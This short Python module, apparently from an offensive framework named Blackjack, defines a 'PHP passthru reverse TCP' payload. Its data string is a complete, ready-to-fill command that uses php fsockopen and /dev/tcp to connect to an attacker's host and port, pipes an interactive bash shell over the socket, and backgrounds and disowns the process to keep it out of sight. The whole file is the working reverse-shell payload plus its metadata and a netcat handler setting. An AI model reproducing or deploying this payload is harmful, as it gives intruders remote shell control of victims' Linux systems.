# This module is part of the Blackjack framework

class Payload:

    info = {
        'Title' : 'PHP passthru reverse TCP',
        'Author' : 'Rojahs Montari (r0jahsm0ntar1)',
        'Description' : 'PHP popen reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'php-passthru',
        'os' : 'linux'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = "nohup php -r '$sock=fsockopen(\"*LHOST*\",*LPORT*);passthru(\"bash <&3 >&3 2>&3\");' 3<>/dev/tcp/*LHOST*/*LPORT* > /dev/null 2>&1 & disown"
